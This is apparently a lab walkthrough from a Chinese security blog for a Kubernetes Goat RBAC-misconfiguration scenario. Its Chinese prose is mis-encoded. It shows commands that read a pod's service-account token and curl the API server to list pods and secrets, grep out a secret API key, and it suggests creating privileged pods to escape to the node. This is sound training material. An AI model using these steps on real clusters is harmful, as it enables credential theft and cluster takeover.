<h2 id="3-10-RBAC-least-privileges-misconfiguration-ğŸŒŸ"><a href="#3-10-RBAC-least-privileges-misconfiguration-ğŸŒŸ" class="headerlink" title="3.10 RBAC least privileges misconfiguration ğŸŒŸ"></a>3.10 RBAC least privileges misconfiguration ğŸŒŸ</h2><p>RBACé…ç½®é”™è¯¯å¯¼è‡´ç‰¹æƒå‡çº§ä»¥è·å¾—Kubernetesé›†ç¾¤æ§åˆ¶æƒã€‚</p>
<h3 id="3-10-1-åœºæ™¯ä»‹ç»"><a href="#3-10-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.10.1 åœºæ™¯ä»‹ç»"></a>3.10.1 åœºæ™¯ä»‹ç»</h3><p>åœ¨Kubernetesçš„æ—©æœŸï¼Œæ²¡æœ‰RBACï¼ˆåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼‰è¿™æ ·çš„æ¦‚å¿µï¼Œå®ƒä¸»è¦ä½¿ç”¨ABACï¼ˆåŸºäºå±æ€§çš„è®¿é—®æ§åˆ¶ï¼‰ã€‚ç°åœ¨å®ƒåŸºäºRBACæ¥å®ç°æœ€å°æƒé™çš„å®‰å…¨åŸåˆ™ã€‚å°½ç®¡å¦‚æ­¤ï¼Œå¤§å¤šæ•°å®é™…å·¥ä½œè´Ÿè½½å’Œèµ„æºæœ€ç»ˆéƒ½æ‹¥æœ‰æ¯”é¢„æœŸæ›´å¹¿æ³›çš„ç‰¹æƒã€‚åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°åƒè¿™æ ·çš„ç®€å•é”™è¯¯é…ç½®æ˜¯å¦‚ä½•å¯¼è‡´æ”»å‡»è€…å¯ä»¥è·å¾—å¯¹secretsã€æ›´å¤šèµ„æºå’Œæ•æ„Ÿä¿¡æ¯çš„è®¿é—®æƒçš„ã€‚</p>
<p>åœ¨ç°å®ä¸–ç•Œä¸­ï¼Œæˆ‘ä»¬ç»å¸¸çœ‹åˆ°å¼€å‘äººå‘˜å’ŒDevOpså›¢é˜Ÿå€¾å‘äºæä¾›è¶…å‡ºè§’è‰²è¦æ±‚çš„é¢å¤–æƒé™ã€‚è¿™ä¸ºæ”»å‡»è€…æä¾›äº†æ¯”é¢„æœŸæ›´å¤šçš„æ§åˆ¶å’Œç‰¹æƒã€‚åœ¨æ­¤åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç»‘å®šåˆ°podçš„æœåŠ¡å¸æˆ·æ¥è·å¾—å¯¹webhookapikeyè®¿é—®ï¼Œæ”»å‡»è€…å¯ä»¥è·å¾—å¯¹å…¶ä»–æ›´å¤šç§˜å¯†å’Œèµ„æºçš„æ§åˆ¶ã€‚</p>
<p>å®è·µç›®çš„ï¼š</p>
<ul>
<li>ä½¿ç”¨REST APIè®¿é—®Kubernetes API Serverå¹¶ä¸ä¹‹é€šä¿¡ã€‚</li>
<li>ä½¿ç”¨ä¸åŒçš„Kubernetesèµ„æºå¹¶æŸ¥è¯¢å®ƒä»¬ã€‚</li>
<li>åˆ©ç”¨é”™è¯¯é…ç½®çš„/è¿‡äºå®½æ¾çš„æƒé™æ¥è®¿é—®æ•æ„Ÿä¿¡æ¯å’Œèµ„æºã€‚</li>
</ul>
<h3 id="3-10-2-åœºæ™¯è®¿é—®"><a href="#3-10-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.10.2 åœºæ™¯è®¿é—®"></a>3.10.2 åœºæ™¯è®¿é—®</h3><p><code>http://192.168.52.13:1236/</code></p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2015.42.49.png" style="zoom:50%;">

<p>ç›®æ ‡ï¼šé€šè¿‡åˆ©ç”¨RBACç‰¹æƒè·å¾—å¯¹Kubernetes secret k8svaultapikeyçš„è®¿é—®æƒé™æ¥è·å¾—k8s_goat_flagã€‚</p>
<blockquote>
<p>hint:</p>
<p>podæœåŠ¡è´¦æˆ·çš„ä¿¡æ¯å­˜å‚¨åœ¨ï¼š**/var/run/secrets/kubernetes.io/serviceaccount/**ä¸‹ã€‚</p>
</blockquote>
<h3 id="3-10-3-åœºæ™¯å®è·µ"><a href="#3-10-3-åœºæ™¯å®è·µ" class="headerlink" title="3.10.3 åœºæ™¯å®è·µ"></a>3.10.3 åœºæ™¯å®è·µ</h3><p>åœºæ™¯ä¸­çš„deploymentæœ‰ä¸€ä¸ªè‡ªå®šä¹‰ServiceAccountï¼Œå®ƒæ˜ å°„äº†ä¸€ä¸ªè¿‡äºå®½æ¾çš„ç­–ç•¥/ç‰¹æƒã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è®¿é—®å…¶ä»–èµ„æºå’ŒæœåŠ¡ã€‚</p>
<h4 id="1ï¼‰è·å–podä¸­çš„ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä¿¡æ¯"><a href="#1ï¼‰è·å–podä¸­çš„ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä¿¡æ¯" class="headerlink" title="1ï¼‰è·å–podä¸­çš„ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä¿¡æ¯"></a>1ï¼‰è·å–podä¸­çš„ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä¿¡æ¯</h4><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒKuberneteså°†æ‰€æœ‰<code>ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä¿¡æ¯</code>å­˜å‚¨åœ¨é»˜è®¤ä½ç½®ã€‚</p>
<p><code>/var/run/secrets/kubernetes.io/serviceaccount/</code> æ˜¯ Kubernetes é›†ç¾¤ä¸­ <strong>Pod è®¿é—® Kubernetes API çš„èº«ä»½å‡­è¯é»˜è®¤æŒ‚è½½è·¯å¾„</strong>ï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯ä¸º Pod æä¾›èº«ä»½è®¤è¯å’Œæƒé™æ§åˆ¶æ‰€éœ€çš„å…³é”®æ–‡ä»¶ã€‚</p>
<p>å½“ Pod å¯åŠ¨æ—¶ï¼ŒKubernetes ä¼š <strong>è‡ªåŠ¨æŒ‚è½½</strong> ä»¥ä¸‹æ–‡ä»¶åˆ°è¯¥è·¯å¾„ï¼ˆè‹¥æœªæ˜¾å¼ç¦ç”¨ï¼‰ï¼š</p>
<table>
<thead>
<tr>
<th align="center"><strong>æ–‡ä»¶</strong></th>
<th align="center"><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>ca.crt</code></td>
<td align="center">é›†ç¾¤çš„æ ¹è¯ä¹¦ï¼Œç”¨äºéªŒè¯ Kubernetes API Server çš„ TLS è¯ä¹¦åˆæ³•æ€§ã€‚</td>
</tr>
<tr>
<td align="center"><code>namespace</code></td>
<td align="center">æ˜æ–‡è®°å½•å½“å‰ Pod æ‰€åœ¨çš„å‘½åç©ºé—´ï¼ˆå¦‚ <code>default</code>ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>token</code></td>
<td align="center">Service Account çš„ JWT ä»¤ç‰Œï¼Œç”¨äº Pod å‘ API Server è®¤è¯èº«ä»½ã€‚</td>
</tr>
</tbody></table>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /var/run/secrets/kubernetes.io/serviceaccount/
<span class="token function">ls</span> <span class="token parameter variable">-larth</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2015.53.42.png" style="zoom:50%;">

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2016.03.47.png" style="zoom:50%;">

<h4 id="2ï¼‰è®¿é—®apiserver"><a href="#2ï¼‰è®¿é—®apiserver" class="headerlink" title="2ï¼‰è®¿é—®apiserver"></a>2ï¼‰è®¿é—®apiserver</h4><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™äº›å‡­è¯ä¿¡æ¯æ¥æŸ¥è¯¢Kubernetes APIæœåŠ¡ï¼Œå¹¶ä½¿ç”¨å¯ç”¨çš„æƒé™å’Œç‰¹æƒè¿›è¡Œé€šä¿¡ã€‚</p>
<p>å¯ä»¥è®¾ç½®ä¸€äº›ç¯å¢ƒå˜é‡æ–¹ä¾¿æ“ä½œã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">APISERVER</span><span class="token operator">=</span>https://<span class="token variable">${KUBERNETES_SERVICE_HOST}</span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">SERVICEACCOUNT</span><span class="token operator">=</span>/var/run/secrets/kubernetes.io/serviceaccount
<span class="token builtin class-name">export</span> <span class="token assign-left variable">NAMESPACE</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> $<span class="token punctuation">{</span>SERVICEACCOUNT<span class="token punctuation">}</span>/namespace<span class="token variable">)</span></span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">TOKEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> $<span class="token punctuation">{</span>SERVICEACCOUNT<span class="token punctuation">}</span>/token<span class="token variable">)</span></span>
<span class="token builtin class-name">export</span> <span class="token assign-left variable">CACERT</span><span class="token operator">=</span><span class="token variable">${SERVICEACCOUNT}</span>/ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¤ç‰Œå’Œæ„é€ çš„æŸ¥è¯¢æ¥æ¢ç´¢Kubernetes APIï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--cacert</span> <span class="token variable">${CACERT}</span> <span class="token parameter variable">--header</span> <span class="token string">"Authorization: Bearer <span class="token variable">${TOKEN}</span>"</span> <span class="token parameter variable">-X</span> GET <span class="token variable">${APISERVER}</span>/api<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<h4 id="å‘½ä»¤è§£æï¼š-2"><a href="#å‘½ä»¤è§£æï¼š-2" class="headerlink" title="å‘½ä»¤è§£æï¼š"></a>å‘½ä»¤è§£æï¼š</h4><p>è¯¥å‘½ä»¤ç”¨äº <strong>é€šè¿‡ HTTPS å®‰å…¨è®¿é—® Kubernetes API æœåŠ¡å™¨</strong>ï¼Œå¹¶è¿›è¡Œèº«ä»½è®¤è¯å’Œæƒé™éªŒè¯ã€‚</p>
<table>
<thead>
<tr>
<th align="center"><strong>å‚æ•°/ç»„ä»¶</strong></th>
<th align="center"><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>curl</code></td>
<td align="center">å‘èµ· HTTP è¯·æ±‚çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</td>
</tr>
<tr>
<td align="center"><code>--cacert ${CACERT}</code></td>
<td align="center">æŒ‡å®š <strong>CA è¯ä¹¦è·¯å¾„</strong>ï¼Œç”¨äºéªŒè¯ API æœåŠ¡å™¨çš„ TLS è¯ä¹¦åˆæ³•æ€§ã€‚</td>
</tr>
<tr>
<td align="center"><code>--header "Authorization: Bearer ${TOKEN}"</code></td>
<td align="center">æ·»åŠ è®¤è¯å¤´ï¼Œä½¿ç”¨ <strong>Bearer Token</strong> è®¤è¯æ–¹å¼ï¼Œ<code>${TOKEN}</code> æ˜¯ JWT ä»¤ç‰Œã€‚</td>
</tr>
<tr>
<td align="center"><code>-X GET</code></td>
<td align="center">æŒ‡å®š HTTP æ–¹æ³•ä¸º <strong>GET</strong>ï¼ˆè·å–èµ„æºï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>${APISERVER}/api</code></td>
<td align="center">ç›®æ ‡ API åœ°å€ï¼Œé€šå¸¸ä¸º Kubernetes API æœåŠ¡å™¨ï¼ˆå¦‚ <code>https://kubernetes.default.svc</code>ï¼‰ã€‚</td>
</tr>
</tbody></table>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2016.50.43.png" style="zoom:50%;">

<h4 id="3ï¼‰è·å–é»˜è®¤å‘½åç©ºé—´ä¸­çš„secrets"><a href="#3ï¼‰è·å–é»˜è®¤å‘½åç©ºé—´ä¸­çš„secrets" class="headerlink" title="3ï¼‰è·å–é»˜è®¤å‘½åç©ºé—´ä¸­çš„secrets"></a>3ï¼‰è·å–é»˜è®¤å‘½åç©ºé—´ä¸­çš„secrets</h4><blockquote>
<p><strong>å‘½åç©ºé—´ï¼ˆNamespaceï¼‰ä¸­çš„ Secrets</strong> æ˜¯ä¸€ç§ç”¨äº <strong>å®‰å…¨å­˜å‚¨å’Œç®¡ç†æ•æ„Ÿä¿¡æ¯</strong>ï¼ˆå¦‚å¯†ç ã€API å¯†é’¥ã€TLS è¯ä¹¦ç­‰ï¼‰çš„èµ„æºå¯¹è±¡ã€‚</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--cacert</span> <span class="token variable">${CACERT}</span> <span class="token parameter variable">--header</span> <span class="token string">"Authorization: Bearer <span class="token variable">${TOKEN}</span>"</span> <span class="token parameter variable">-X</span> GET <span class="token variable">${APISERVER}</span>/api/v1/secrets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2016.54.53.png" style="zoom:50%;">

<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¾—åˆ°æˆæƒã€‚</p>
<h4 id="4ï¼‰è·å–å½“å‰å‘½åç©ºé—´ä¸­çš„secrets"><a href="#4ï¼‰è·å–å½“å‰å‘½åç©ºé—´ä¸­çš„secrets" class="headerlink" title="4ï¼‰è·å–å½“å‰å‘½åç©ºé—´ä¸­çš„secrets"></a>4ï¼‰è·å–å½“å‰å‘½åç©ºé—´ä¸­çš„secrets</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--cacert</span> <span class="token variable">${CACERT}</span> <span class="token parameter variable">--header</span> <span class="token string">"Authorization: Bearer <span class="token variable">${TOKEN}</span>"</span> <span class="token parameter variable">-X</span> GET <span class="token variable">${APISERVER}</span>/api/v1/namespaces/<span class="token variable">${NAMESPACE}</span>/secrets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2016.57.57.png" style="zoom:50%;">

<h4 id="5ï¼‰è®¿é—®pods"><a href="#5ï¼‰è®¿é—®pods" class="headerlink" title="5ï¼‰è®¿é—®pods"></a>5ï¼‰è®¿é—®pods</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--cacert</span> <span class="token variable">${CACERT}</span> <span class="token parameter variable">--header</span> <span class="token string">"Authorization: Bearer <span class="token variable">${TOKEN}</span>"</span> <span class="token parameter variable">-X</span> GET <span class="token variable">${APISERVER}</span>/api/v1/namespaces/<span class="token variable">${NAMESPACE}</span>/pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2017.01.40.png" style="zoom:50%;">

<p>ä»è¿™é‡Œä½ å¯ä»¥å°è¯•åˆ©ç”¨æ‰€æœ‰å¯èƒ½çš„Kubernetesæ“ä½œã€‚å› ä¸ºKubernetesæœ¬èº«ä½œä¸ºAPIæœåŠ¡æ¥åˆ›å»ºå’Œåˆ é™¤podsç­‰ã€‚</p>
<p>ã€å¯ä»¥å°è¯•åˆ›å»ºä¸€äº›æœ‰ç‰¹æƒé€ƒé€¸æ¼æ´çš„podï¼Œå®ç°é€ƒé€¸ï¼Œè·å–èŠ‚ç‚¹æƒé™ã€‚ã€‘</p>
<p>ã€æœ‰æ—¶å€™å¦‚æœæœåŠ¡è´¦æˆ·çš„tokenæƒé™æ¯”è¾ƒé«˜ï¼Œç”šè‡³å¯ä»¥è·å¾—k8sé›†ç¾¤çš„æœ€é«˜æ§åˆ¶æƒã€‚ã€‘</p>
<h4 id="6ï¼‰ä»secretsä¸­è·å–k8svaulapikeyçš„å€¼"><a href="#6ï¼‰ä»secretsä¸­è·å–k8svaulapikeyçš„å€¼" class="headerlink" title="6ï¼‰ä»secretsä¸­è·å–k8svaulapikeyçš„å€¼"></a>6ï¼‰ä»secretsä¸­è·å–k8svaulapikeyçš„å€¼</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">--cacert</span> <span class="token variable">${CACERT}</span> <span class="token parameter variable">--header</span> <span class="token string">"Authorization: Bearer <span class="token variable">${TOKEN}</span>"</span> <span class="token parameter variable">-X</span> GET <span class="token variable">${APISERVER}</span>/api/v1/namespaces/<span class="token variable">${NAMESPACE}</span>/secrets <span class="token operator">|</span> <span class="token function">grep</span> k8svaultapikey <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

